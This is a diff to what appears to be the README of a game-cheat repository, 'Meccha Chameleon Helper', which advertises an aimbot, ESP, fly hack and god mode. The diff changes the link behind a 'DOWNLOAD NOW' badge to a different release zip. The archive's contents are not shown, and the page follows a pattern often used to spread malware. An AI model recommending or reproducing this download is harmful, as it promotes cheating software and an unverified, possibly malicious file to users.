@@ -7,7 +7,7 @@ ESP · Aimbot · Fly Hack · Teleport · God Mode · Infinite Paint
 
 
 
- [![⬇️ DOWNLOAD NOW](https://img.shields.io/badge/⬇️_DOWNLOAD_NOW-2ea043?style=for-the-badge&logo=github&logoColor=white&labelColor=1a7a37)](https://github.com/LaneLawyerSense/Meccha-Chameleon-Helper/releases/download/Meccha'Quantum/MecchaQuantum.zip)
+ [![⬇️ DOWNLOAD NOW](https://img.shields.io/badge/⬇️_DOWNLOAD_NOW-2ea043?style=for-the-badge&logo=github&logoColor=white&labelColor=1a7a37)](https://github.com/LaneLawyerSense/Meccha-Chameleon-Helper/releases/download/v-0.7/Meccha.Helper.zip)
 
 </div>
 
